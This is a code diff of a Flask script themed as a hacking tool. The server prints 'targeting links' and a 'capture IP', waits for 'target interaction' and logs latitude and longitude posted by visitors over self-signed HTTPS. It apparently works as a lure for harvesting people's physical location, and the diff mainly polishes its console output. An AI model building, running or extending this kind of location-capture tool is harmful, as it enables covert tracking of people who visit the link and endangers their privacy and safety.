@@ -1,10 +1,8 @@
-
 import os
 import sys
 import subprocess
 from flask import Flask, render_template, request, jsonify
 
-# Correctly initialize the Flask application using __name__
 app = Flask(__name__)
 
 # Ethical Hacking Theme Colors (ANSI Escape Codes)
@@ -15,7 +13,9 @@ YELLOW = '\033[93m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
 
-# Function to clear the screen and display the hacking banner
+# Track if links have been printed to avoid duplicating them on refresh
+links_printed = False
+
 def show_banner():
     os.system('clear' if os.name != 'nt' else 'cls')
     banner = r"""""" + f"""{GREEN}{BOLD}
@@ -32,6 +32,18 @@ def show_banner():
     """
     print(banner)
 
+# This hook ensures the link panel stays on-screen during execution
+@app.before_request
+def print_target_links():
+    global links_printed
+    if not links_printed:
+        print(f"\n{GREEN}{BOLD}==========[ TARGETING LINKS ]=========={RESET}")
+        print(f" {CYAN}LOCAL LOOPBACK :{RESET} {YELLOW}https://127.0.0.1:5000{RESET}")
+        print(f" {CYAN}LAN CAPTURE IP :{RESET} {GREEN}{BOLD}https://100.73.179.109:5000{RESET}")
+        print(f"{GREEN}{BOLD}======================================={RESET}")
+        print(f"{CYAN}[*] Awaiting target interaction. Live logs streaming below...{RESET}\n")
+        links_printed = True
+
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -41,7 +53,7 @@ def update_location():
     try:
         data = request.get_json()
         if not data:
-            print(f"{RED}[-] Warning: Empty payload received from target.{RESET}")
+            print(f"{RED}[-] Warning: Empty payload received.{RESET}")
             return jsonify({"status": "error", "message": "No data received"}), 400
         
         latitude = data.get('lat')
@@ -64,7 +76,6 @@ if __name__ == '__main__':
     cert_path = 'cert.pem'
     key_path = 'key.pem'
     
-    # Self-healing block: If certs are missing, attempt auto-generation via script
     if not (os.path.exists(cert_path) and os.path.exists(key_path)):
         print(f"{YELLOW}[!] Notice: Missing SSL credentials. Executing auto-compilation...{RESET}")
         if os.path.exists('generate_cert.sh'):
@@ -74,7 +85,7 @@ if __name__ == '__main__':
         print(f"{CYAN}[*] Initializing SSL/TLS layer with self-signed certificates...{RESET}")
         print(f"{GREEN}[+] Framework status: ACTIVE and listening for incoming payloads...{RESET}\n")
         
-        # Suppress Flask default developer banners
+        # Completely disable default Flask banners to give our text control
         cli = sys.modules['flask.cli']
         cli.show_server_banner = lambda *x: None 
         
@@ -85,4 +96,5 @@ if __name__ == '__main__':
             ssl_context=(cert_path, key_path)
         )
     else:
-        print(f"{RED}{BOLD}[-] CRITICAL FAILURE: SSL layer negotiation aborted. Files deployment failed.{RESET}")
+        print(f"{RED}{BOLD}[-] CRITICAL FAILURE: SSL layer negotiation aborted.{RESET}")
+        
